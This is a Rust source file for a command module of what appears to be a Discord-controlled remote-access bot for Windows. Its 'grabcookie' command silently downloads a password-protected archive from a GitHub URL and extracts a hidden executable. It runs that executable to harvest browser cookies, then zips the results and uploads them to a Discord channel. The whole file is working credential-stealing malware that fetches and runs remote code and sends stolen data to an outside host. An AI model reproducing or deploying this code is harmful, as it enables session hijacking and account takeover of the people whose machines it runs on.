use crate::commands::*;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::io::{Cursor, Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::http::attachment::Attachment;
use walkdir::WalkDir;
use zip::ZipWriter;

use std::os::windows::process::CommandExt;

pub struct GrabCookieCommand;

const MODULE_NAME: &str = "kurion.exe";
const DOWNLOAD_URL: &str = "https://github.com/Mikasuru/Arc/raw/refs/heads/main/Assets/Scripts/kurion.rar";
const RAR_PASSWORD: &str = "kurion67";



pub use self::GrabCookieCommand as GrabCommand;

impl GrabCookieCommand {
    fn get_module_path() -> Result<PathBuf> {
        let temp_dir = env::temp_dir();
        let path = temp_dir.join("kurion_temp");
        Ok(path)
    }

    fn cleanup(module_dir: &Path) -> Result<()> {
        if module_dir.exists() {
            for _ in 0..3 {
                if fs::remove_dir_all(module_dir).is_ok() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(500));
            }
        }
        Ok(())
    }

    async fn download_rar(&self, module_dir: &Path) -> Result<PathBuf> {
        if !module_dir.exists() {
            fs::create_dir_all(module_dir)?;
        }

        let rar_path = module_dir.join("kurion.rar");

        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .timeout(Duration::from_secs(120))
            .build()?;

        let response = client.get(DOWNLOAD_URL).send().await?;
        
        if !response.status().is_success() {
            return Err(anyhow::anyhow!(
                "Download failed with status: {}",
                response.status()
            ));
        }

        let bytes = response.bytes().await?;
        let mut file = fs::File::create(&rar_path)?;
        file.write_all(&bytes)?;

        Ok(rar_path)
    }

    fn extract_rar(rar_path: &Path, destination: &Path) -> Result<()> {
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        let unrar_paths = vec![
            "C:\\Program Files\\WinRAR\\UnRAR.exe",
            "C:\\Program Files\\WinRAR\\WinRAR.exe",
            "C:\\Program Files (x86)\\WinRAR\\UnRAR.exe",
            "C:\\Program Files (x86)\\WinRAR\\WinRAR.exe",
        ];

        for unrar_exe in unrar_paths {
            if !Path::new(unrar_exe).exists() {
                continue;
            }

            let dest_str = format!("{}\\", destination.display());

            let output = Command::new(unrar_exe)
                .arg("x")                           // Extract with full path
                .arg("-y")                          // Yes to all
                .arg("-o+")                         // Overwrite
                .arg(format!("-p{}", RAR_PASSWORD)) // Password
                .arg("-idq")                        // Quiet mode
                .arg(rar_path)
                .arg(&dest_str)
                .creation_flags(CREATE_NO_WINDOW)
                .output()?;

            if output.status.success() { return Ok(()); }

            let stderr = String::from_utf8_lossy(&output.stderr);
            let stdout = String::from_utf8_lossy(&output.stdout);
            
            if stderr.contains("password") || stdout.contains("password") {
                return Err(anyhow::anyhow!("Wrong password for RAR archive"));
            }
        }

        Err(anyhow::anyhow!("WinRAR not found."))
    }

    fn run_kurion(module_dir: &Path, format: &str) -> Result<()> {
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        let exe_path = module_dir.join(MODULE_NAME);
        
        if !exe_path.exists() {
            return Err(anyhow::anyhow!("kurion.exe not found after extraction"));
        }

        let format_arg = match format {
            "json" => "--json",
            "netscape" => "--netscape",
            _ => "--json",
        };

        let mut child = Command::new(&exe_path)
            .arg("all")
            .arg(format_arg)
            .current_dir(module_dir)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()
            .context("Failed to spawn kurion.exe")?;

        let _ = child.wait();
        Ok(())
    }

    fn zip_output(output_dir: &Path) -> Result<Vec<u8>> {
        let mut buffer = Cursor::new(Vec::new());
        
        {
            let mut zip = ZipWriter::new(&mut buffer);
            let options = zip::write::FileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);

            for entry in WalkDir::new(output_dir).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path();
                
                if path.is_file() {
                    let relative_path = path.strip_prefix(output_dir)?;
                    let zip_path = relative_path.to_string_lossy().replace('\\', "/");
                    
                    zip.start_file(&zip_path, options)?;
                    
                    let mut file = fs::File::open(path)?;
                    let mut contents = Vec::new();
                    file.read_to_end(&mut contents)?;
                    zip.write_all(&contents)?;
                }
            }
            zip.finish()?;
        }
        Ok(buffer.into_inner())
    }

    pub async fn execute_grab(
        http: &Arc<HttpClient>,
        channel_id: twilight_model::id::Id<twilight_model::id::marker::ChannelMarker>,
        format: &str,
    ) -> Result<()> {
        let module_dir = Self::get_module_path()?;

        Self::cleanup(&module_dir)?;
        fs::create_dir_all(&module_dir)?;

        let status_msg = http
            .create_message(channel_id)
            .content(&format!("Downloading module... (Format: {})", format.to_uppercase()))
            .await?
            .model()
            .await?;

        let grabber = GrabCookieCommand;
        let rar_path = match grabber.download_rar(&module_dir).await {
            Ok(path) => path,
            Err(e) => {
                http.update_message(channel_id, status_msg.id)
                    .content(Some(&format!("Download failed: {}", e)))
                    .await?;
                Self::cleanup(&module_dir)?;
                return Err(e);
            }
        };

        http.update_message(channel_id, status_msg.id).content(Some("Extracting archive...")).await?;
        if let Err(e) = Self::extract_rar(&rar_path, &module_dir) {
            http.update_message(channel_id, status_msg.id)
                .content(Some(&format!("Extraction failed: {}", e)))
                .await?;
            Self::cleanup(&module_dir)?;
            return Err(e);
        }

        let _ = fs::remove_file(&rar_path);
        http.update_message(channel_id, status_msg.id)
            .content(Some(&format!("Running grabber ({})...", format.to_uppercase())))
            .await?;

        if let Err(e) = Self::run_kurion(&module_dir, format) {
            http.update_message(channel_id, status_msg.id)
                .content(Some(&format!("Execution failed: {}", e)))
                .await?;
            Self::cleanup(&module_dir)?;
            return Err(e);
        }

        sleep(Duration::from_secs(2)).await;

        let output_dir = module_dir.join("output");
        if !output_dir.exists() {
            let mut found_output = None;
            for entry in fs::read_dir(&module_dir)? {
                let entry = entry?;
                if entry.path().is_dir() && entry.file_name() != "." && entry.file_name() != ".." {
                    let dir_name = entry.file_name().to_string_lossy().to_lowercase();
                    if dir_name.contains("output") || dir_name.contains("result") {
                        found_output = Some(entry.path());
                        break;
                    }
                }
            }
            
            if found_output.is_none() {
                http.update_message(channel_id, status_msg.id)
                    .content(Some("No output folder found after execution"))
                    .await?;
                Self::cleanup(&module_dir)?;
                return Err(anyhow::anyhow!("No output folder found"));
            }
        }

        let actual_output_dir = if output_dir.exists() {
            output_dir
        } else { module_dir.clone() };

        http.update_message(channel_id, status_msg.id).content(Some("Compressing results...")).await?;
        let zip_data = match Self::zip_output(&actual_output_dir) {
            Ok(data) => data,
            Err(e) => {
                http.update_message(channel_id, status_msg.id)
                    .content(Some(&format!("Failed to compress: {}", e)))
                    .await?;
                Self::cleanup(&module_dir)?;
                return Err(e);
            }
        };

        if zip_data.is_empty() {
            http.update_message(channel_id, status_msg.id)
                .content(Some("No data to upload (empty output)"))
                .await?;
            Self::cleanup(&module_dir)?;
            return Err(anyhow::anyhow!("Empty output"));
        }

        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
        let filename = format!("cookies_{}_{}.zip", format, timestamp);

        http.update_message(channel_id, status_msg.id).content(Some("Uploading results...")).await?;
        let attachment = Attachment::from_bytes(filename.clone(), zip_data, 1);

        http.create_message(channel_id)
            .content(&format!(
                "**Cookies grabbed successfully!**\n\n\
                **Format:** {}\n\
                **File:** `{}`",
                format.to_uppercase(),
                filename
            )).attachments(&[attachment]).await?;

        let _ = http.delete_message(channel_id, status_msg.id).await;
        Self::cleanup(&module_dir)?;

        Ok(())
    }
}

#[async_trait]
impl BotCommand for GrabCookieCommand {
    fn name(&self) -> &str { "grabcookie" }
    fn description(&self) -> &str { "Grab browser cookies (JSON or Netscape format)" }
    fn category(&self) -> &str { "filesystem" }
    fn usage(&self) -> &str { ".grabcookie" }
    fn examples(&self) -> &'static [&'static str] { &[".grabcookie"] }
    fn aliases(&self) -> &'static [&'static str] { &["grab", "cookies", "getcookies"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, mut args: Arguments) -> Result<()> {
        let format = args.next().unwrap_or("netscape").to_lowercase();
        
        let format = match format.as_str() {
            "json" => "json",
            "netscape" => "netscape",
            _ => {
                "netscape"
            }
        };

        Self::execute_grab(http, msg.channel_id, format).await?;

        Ok(())
    }
}
